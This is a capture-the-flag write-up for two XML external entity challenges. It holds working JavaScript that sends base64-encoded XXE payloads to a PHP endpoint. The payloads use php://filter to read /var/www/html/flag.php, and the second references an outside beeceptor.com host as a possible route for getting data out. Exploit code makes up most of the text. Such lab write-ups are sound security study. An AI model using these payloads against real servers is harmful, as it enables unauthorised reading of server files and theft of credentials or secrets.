
  

#  XXE

The goal for getting the flag on XXE is to change the XML data sent to the server.
BY using vulnerabilities on "ENTITY" element, we can encode in base64 content of file present in the server.
Then we need to find a way to display it and get the flag.
For XXE1 it's simple because the server is printing it.
For XXE2 we need to force the printing or find a way to send the base64 response to a place we can see it.
I opt for trigger an error containing the flag and that worked.


### XXE1
```js
const message = "d"
const xml_payload = `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php" >]>
<document>
 <message>&xxe;</message>
 </document>`;

    let o = $.ajax({
      url: "index.php",
      type: "POST",
      data: { xml: btoa(xml_payload) },
      success: response => {
        document.getElementById("error").text = response;
          console.log(o.getAllResponseHeaders(),"\n",response)
      }
    });
```

### XXE2

```js
const message = "d"
const xml_payload =
      `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php" >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://tettte.free.beeceptor.com/">
%file;
]>
<document>
 <message>&xxe;</message>
 </document>    `;

    let o = $.ajax({
      url: "index.php",
      type: "POST",
      data: { xml: btoa(xml_payload) },
      success: response => {
        document.getElementById("error").text = response;
          console.log(o.getAllResponseHeaders(),"\n",response)
      }
    });
```